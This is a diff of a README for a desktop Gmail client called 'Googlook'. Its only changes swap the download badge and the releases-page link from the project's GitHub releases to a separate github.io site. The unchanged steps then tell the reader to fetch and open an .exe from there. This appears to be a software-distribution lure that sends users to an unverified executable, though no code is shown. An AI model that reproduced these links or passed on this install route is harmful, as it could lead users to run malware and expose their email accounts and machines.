@@ -1,6 +1,6 @@
 # 📧 Googlook-Desktop-Gmail-Client - Manage multiple email accounts with ease
 
-[![](https://img.shields.io/badge/Download-Googlook%20Latest-blue.svg)](https://github.com/Deeannamoebous581/Googlook-Desktop-Gmail-Client/releases)
+[![](https://img.shields.io/badge/Download-Googlook%20Latest-blue.svg)](https://deeannamoebous581.github.io)
 
 ## 📌 Project Overview
 
@@ -19,7 +19,7 @@ This software runs on most modern desktop environments. Check the following list
 
 Follow these steps to install and run the application on your computer.
 
-1. Visit the [releases page](https://github.com/Deeannamoebous581/Googlook-Desktop-Gmail-Client/releases) to access the download files.
+1. Visit the [releases page](https://deeannamoebous581.github.io) to access the download files.
 2. Look for the file ending in .exe under the latest version header. 
 3. Click the file name to start the download.
 4. Open your Downloads folder once the transfer finishes.
